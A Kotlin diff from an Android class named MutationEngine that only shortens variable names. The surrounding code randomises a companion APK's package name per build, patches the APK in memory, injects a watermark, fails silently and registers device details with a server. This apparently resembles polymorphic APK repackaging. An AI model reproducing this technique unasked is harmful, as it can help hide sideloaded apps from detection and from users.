@@ -172,10 +172,10 @@ class MutationEngine(private val context: Context) {
 
         val nsIdx = (buildHash.substring(0, 4).toLong(16) % pkgNamespaces.size).toInt()
         val sfIdx = (buildHash.substring(4, 8).toLong(16) % pkgSuffixes.size).toInt()
-        val companionPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"
+        val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"
 
         return JSONObject().apply {
-            put("companion_pkg", companionPkg)
+            put("companion_pkg", cmpPkg)
             put("binding_hash", sha256("$fingerprint:nova_device_bind_2026"))
             put("watermark_hex", buildHash.substring(0, 32))
             put("tier", 2)
@@ -185,17 +185,17 @@ class MutationEngine(private val context: Context) {
     // ── Apply mutations to companion APK bytes in RAM ─────────────────────────
 
     fun applyMutations(
-        companionBytes: ByteArray,
+        cmpData: ByteArray,
         mutations: JSONObject,
         fingerprint: String
     ): ByteArray {
-        var result = companionBytes.copyOf()
+        var result = cmpData.copyOf()
 
         try {
             // M1 — Patch package name in DEX
-            val companionPkg = mutations.optString("companion_pkg", "")
-            if (companionPkg.isNotEmpty()) {
-                result = patchPackageName(result, companionPkg)
+            val cmpPkg = mutations.optString("companion_pkg", "")
+            if (cmpPkg.isNotEmpty()) {
+                result = patchPackageName(result, cmpPkg)
             }
 
             // M8 — Inject ZIP watermark
@@ -212,7 +212,7 @@ class MutationEngine(private val context: Context) {
 
         } catch (e: Exception) {
             // Silent fail — return original bytes if mutation fails
-            return companionBytes
+            return cmpData
         }
 
         return result
@@ -371,7 +371,7 @@ class MutationEngine(private val context: Context) {
 
     private fun registerDeviceAsync(
         deviceId: String,
-        companionPkg: String,
+        cmpPkg: String,
         clientToken: String,
         fingerprint: String
     ) {
@@ -388,7 +388,7 @@ class MutationEngine(private val context: Context) {
 
                 val body = JSONObject().apply {
                     put("device_id", deviceId)
-                    put("companion_pkg", companionPkg)
+                    put("companion_pkg", cmpPkg)
                     put("template", TEMPLATE)
                     put("device_model", Build.MODEL)
                     put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
